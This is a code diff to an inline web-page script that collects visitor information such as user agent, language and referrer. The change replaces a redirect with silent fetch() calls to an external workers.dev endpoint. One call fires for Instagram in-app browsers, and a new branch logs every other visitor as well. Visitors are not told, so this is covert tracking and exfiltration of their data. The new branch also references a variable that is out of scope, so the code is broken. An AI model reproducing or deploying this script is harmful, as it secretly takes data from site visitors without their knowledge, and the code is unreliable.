@@ -62,7 +62,7 @@
       // Referrer
       const refUrl = document.referrer;
 
-      // Gabungin semua info ke 1 string buat di-encode
+    
       const infoText = `
 🧭 User Agent: ${userAgent}
 🌐 Language: ${language}
@@ -76,15 +76,19 @@
 🔗 Referrer: ${refUrl}
       `.trim();
 
-      // Cek kalo pake Instagram browser
+    
       const urlParams = new URLSearchParams(window.location.search);
     
     const fromWorker = urlParams.has("from");
     
-      if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
-        const encoded = encodeURIComponent(infoText);
-        window.location.href = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
-      }
+if (userAgent.toLowerCase().includes("instagram") && !fromWorker) {
+  const encoded = encodeURIComponent(infoText);
+  const url = `https://workers.client57.workers.dev/api/rfig?result=%0A${encoded}`;
+  fetch(url); 
+} else {
+  const flog = `https://workers.client57.workers.dev/api/log?result=%0A${encoded}`;
+  fetch(flog);
+}
     })();
   </script>
 
